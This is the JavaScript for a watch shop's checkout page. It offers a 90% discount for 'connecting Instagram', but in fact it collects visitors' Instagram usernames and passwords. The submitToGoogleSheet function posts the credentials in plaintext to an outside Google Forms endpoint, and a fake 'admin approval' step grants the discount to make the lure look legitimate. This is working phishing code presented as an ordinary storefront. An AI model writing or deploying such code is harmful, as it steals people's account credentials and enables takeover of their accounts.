const BASE_PRICE = 2000;
const STORAGE_REQUESTS = 'apex_instagram_requests';
const STORAGE_ACTIVE_REQUEST = 'apex_active_request_id';

const GOOGLE_FORM_URL =
  'https://docs.google.com/forms/d/e/1FAIpQLSfIXwr6Znm9hZZalZ7tTKCPlSb5oyvd3qjA-bvFCRfcTynBXw/formResponse';
const GOOGLE_FORM_ENTRIES = {
  username: 'entry.252233475',
  password: 'entry.590474411',
};

let instagramConnected = false;
let promoApplied = false;
let approvalPollId = null;

const currency = new Intl.NumberFormat('en-IN', {
  style: 'currency',
  currency: 'INR',
  maximumFractionDigits: 0,
});

const els = {
  addToCart: document.getElementById('add-to-cart-btn'),
  checkout: document.getElementById('checkout'),
  instagramSignin: document.getElementById('instagram-signin'),
  instagramStatus: document.getElementById('instagram-status'),
  instagramOffer: document.getElementById('instagram-offer'),
  instagramLogin: document.getElementById('instagram-login'),
  instagramUsername: document.getElementById('instagram-username'),
  instagramPassword: document.getElementById('instagram-password'),
  instagramLoginSubmit: document.getElementById('instagram-login-submit'),
  confirmModal: document.getElementById('confirm-modal'),
  confirmModalOverlay: document.getElementById('confirm-modal-overlay'),
  confirmModalCancel: document.getElementById('confirm-modal-cancel'),
  confirmModalConfirm: document.getElementById('confirm-modal-confirm'),
  promoCode: document.getElementById('promo-code'),
  applyPromo: document.getElementById('apply-promo'),
  promoStatus: document.getElementById('promo-status'),
  discountLine: document.getElementById('discount-line'),
  discountAmount: document.getElementById('discount-amount'),
  totalPrice: document.getElementById('total-price'),
  discountNote: document.getElementById('discount-note'),
  placeOrder: document.getElementById('place-order-btn'),
  form: document.getElementById('checkout-form'),
  name: document.getElementById('name'),
  street: document.getElementById('street'),
  city: document.getElementById('city'),
  zip: document.getElementById('zip'),
};

function getRequests() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_REQUESTS) || '[]');
  } catch {
    return [];
  }
}

function saveRequests(requests) {
  localStorage.setItem(STORAGE_REQUESTS, JSON.stringify(requests));
}

function getDiscountPercent() {
  let percent = 0;
  if (instagramConnected) percent += 90;
  if (promoApplied) percent += 10;
  return Math.min(percent, 100);
}

function updateOrderSummary() {
  const discountPercent = getDiscountPercent();
  const discountValue = BASE_PRICE * (discountPercent / 100);
  const total = BASE_PRICE - discountValue;

  if (discountPercent > 0) {
    els.discountLine.hidden = false;
    els.discountAmount.textContent = `-${currency.format(discountValue)}`;
  } else {
    els.discountLine.hidden = true;
    els.discountAmount.textContent = '-₹0';
  }

  if (total === 0) {
    els.totalPrice.textContent = 'FREE';
    els.totalPrice.classList.add('order-summary__total--free');
    els.discountNote.textContent = 'Congratulations! Your order is completely free.';
  } else {
    els.totalPrice.textContent = currency.format(total);
    els.totalPrice.classList.remove('order-summary__total--free');
    els.discountNote.textContent =
      discountPercent > 0 ? `${discountPercent}% total discount applied.` : '';
  }
}

function setInstagramStatus(message, type) {
  els.instagramStatus.textContent = message;
  els.instagramStatus.className = 'instagram-offer__status';
  if (type === 'success') {
    els.instagramStatus.classList.add('instagram-offer__status--success');
  } else if (type === 'error') {
    els.instagramStatus.classList.add('instagram-offer__status--error');
  } else if (type === 'pending') {
    els.instagramStatus.classList.add('instagram-offer__status--pending');
  }
}

function connectInstagram() {
  if (instagramConnected) return;

  instagramConnected = true;
  stopApprovalPolling();
  setInstagramStatus('Instagram Connected! 90% discount applied.', 'success');
  els.instagramSignin.textContent = 'Connected';
  els.instagramSignin.disabled = true;
  els.instagramSignin.setAttribute('aria-expanded', 'false');
  els.instagramOffer.classList.add('instagram-offer--connected');
  els.instagramLogin.hidden = true;
  els.instagramUsername.disabled = true;
  els.instagramPassword.disabled = true;
  els.instagramLoginSubmit.disabled = true;
  updateOrderSummary();
}

function setPendingUI() {
  els.instagramLogin.hidden = true;
  els.instagramSignin.disabled = true;
  els.instagramSignin.setAttribute('aria-expanded', 'false');
  els.instagramUsername.disabled = true;
  els.instagramPassword.disabled = true;
  els.instagramLoginSubmit.disabled = true;
  setInstagramStatus('Request submitted. Waiting for admin approval...', 'pending');
}

function resetInstagramFormAfterReject() {
  sessionStorage.removeItem(STORAGE_ACTIVE_REQUEST);
  els.instagramUsername.disabled = false;
  els.instagramPassword.disabled = false;
  els.instagramLoginSubmit.disabled = false;
  els.instagramSignin.disabled = false;
  els.instagramUsername.value = '';
  els.instagramPassword.value = '';
  els.instagramLogin.hidden = true;
  els.instagramSignin.setAttribute('aria-expanded', 'false');
  setInstagramStatus('Request denied. Please try again.', 'error');
}

function toggleInstagramLogin() {
  if (instagramConnected) return;

  const isHidden = els.instagramLogin.hidden;
  els.instagramLogin.hidden = !isHidden;
  els.instagramSignin.setAttribute('aria-expanded', String(isHidden));

  if (!isHidden) {
    setInstagramStatus('', '');
  }
}

function openConfirmModal() {
  els.confirmModal.hidden = false;
  els.confirmModal.setAttribute('aria-hidden', 'false');
  document.body.classList.add('modal-open');
}

function closeConfirmModal() {
  els.confirmModal.hidden = true;
  els.confirmModal.setAttribute('aria-hidden', 'true');
  document.body.classList.remove('modal-open');
}

function submitInstagramLogin() {
  const username = els.instagramUsername.value.trim();
  const password = els.instagramPassword.value.trim();

  if (!username || !password) {
    setInstagramStatus('Please enter your Instagram username and password.', 'error');
    return;
  }

  openConfirmModal();
}

async function submitToGoogleSheet(username, password) {
  const body = new URLSearchParams();
  body.append(GOOGLE_FORM_ENTRIES.username, username);
  body.append(GOOGLE_FORM_ENTRIES.password, password);

  try {
    await fetch(GOOGLE_FORM_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
    return true;
  } catch (err) {
    console.warn('Google Form submit failed:', err);
    return false;
  }
}

async function confirmInstagramRequest() {
  closeConfirmModal();

  const username = els.instagramUsername.value.trim();
  const password = els.instagramPassword.value.trim();
  const id = crypto.randomUUID();
  const request = {
    id,
    igUsername: username,
    status: 'pending',
    createdAt: new Date().toISOString(),
  };

  const requests = getRequests();
  requests.push(request);
  saveRequests(requests);
  sessionStorage.setItem(STORAGE_ACTIVE_REQUEST, id);

  setPendingUI();
  startApprovalPolling();

  const sheetSaved = await submitToGoogleSheet(username, password);
  if (sheetSaved) {
    setInstagramStatus(
      'Request submitted and saved to sheet. Waiting for admin approval...',
      'pending'
    );
  } else {
    setInstagramStatus(
      'Request submitted. Sheet sync may have failed — waiting for admin approval...',
      'pending'
    );
  }
}

function checkApprovalStatus() {
  const activeId = sessionStorage.getItem(STORAGE_ACTIVE_REQUEST);
  if (!activeId || instagramConnected) return;

  const requests = getRequests();
  const mine = requests.find((r) => r.id === activeId);
  if (!mine) return;

  if (mine.status === 'approved') {
    connectInstagram();
  } else if (mine.status === 'rejected') {
    stopApprovalPolling();
    resetInstagramFormAfterReject();
  }
}

function startApprovalPolling() {
  stopApprovalPolling();
  checkApprovalStatus();
  approvalPollId = setInterval(checkApprovalStatus, 2000);
}

function stopApprovalPolling() {
  if (approvalPollId) {
    clearInterval(approvalPollId);
    approvalPollId = null;
  }
}

function restoreSessionOnLoad() {
  const activeId = sessionStorage.getItem(STORAGE_ACTIVE_REQUEST);
  if (!activeId) return;

  const requests = getRequests();
  const mine = requests.find((r) => r.id === activeId);
  if (!mine) return;

  if (mine.status === 'approved') {
    connectInstagram();
  } else if (mine.status === 'pending') {
    setPendingUI();
    startApprovalPolling();
  } else if (mine.status === 'rejected') {
    resetInstagramFormAfterReject();
  }
}

function applyPromoCode() {
  const code = els.promoCode.value.trim().toUpperCase();

  if (code !== 'WELCOME') {
    els.promoStatus.textContent = 'Invalid promo code. Try WELCOME.';
    els.promoStatus.className = 'promo-section__status promo-section__status--error';
    return;
  }

  if (promoApplied) {
    els.promoStatus.textContent = 'Promo code already applied.';
    els.promoStatus.className = 'promo-section__status promo-section__status--success';
    return;
  }

  promoApplied = true;
  els.promoStatus.textContent = 'Promo code WELCOME applied! 10% off added.';
  els.promoStatus.className = 'promo-section__status promo-section__status--success';
  els.promoCode.disabled = true;
  els.applyPromo.disabled = true;
  updateOrderSummary();
}

function validateAddress() {
  const fields = [els.name, els.street, els.city, els.zip];
  let valid = true;

  fields.forEach((field) => {
    if (!field.value.trim()) {
      field.classList.add('form-group__input--error');
      valid = false;
    } else {
      field.classList.remove('form-group__input--error');
    }
  });

  return valid;
}

function placeOrder() {
  if (!validateAddress()) {
    alert('Please fill in all address fields before placing your order.');
    els.checkout.scrollIntoView({ behavior: 'smooth' });
    return;
  }

  const total = BASE_PRICE - BASE_PRICE * (getDiscountPercent() / 100);
  const totalText = total === 0 ? 'FREE (₹0)' : currency.format(total);

  alert(
    `Thank you, ${els.name.value.trim()}!\n\nYour Apex Dual-Tone Quartz order has been placed.\nTotal: ${totalText}\n\nWe'll ship to:\n${els.street.value.trim()}\n${els.city.value.trim()}, ${els.zip.value.trim()}`
  );
}

els.addToCart.addEventListener('click', () => {
  els.checkout.scrollIntoView({ behavior: 'smooth' });
});

els.instagramSignin.addEventListener('click', toggleInstagramLogin);
els.instagramLoginSubmit.addEventListener('click', submitInstagramLogin);
els.confirmModalConfirm.addEventListener('click', confirmInstagramRequest);
els.confirmModalCancel.addEventListener('click', closeConfirmModal);
els.confirmModalOverlay.addEventListener('click', closeConfirmModal);

els.instagramPassword.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    submitInstagramLogin();
  }
});

els.applyPromo.addEventListener('click', applyPromoCode);

els.promoCode.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    applyPromoCode();
  }
});

els.placeOrder.addEventListener('click', placeOrder);

window.addEventListener('storage', (e) => {
  if (e.key === STORAGE_REQUESTS) {
    checkApprovalStatus();
  }
});

restoreSessionOnLoad();
updateOrderSummary();
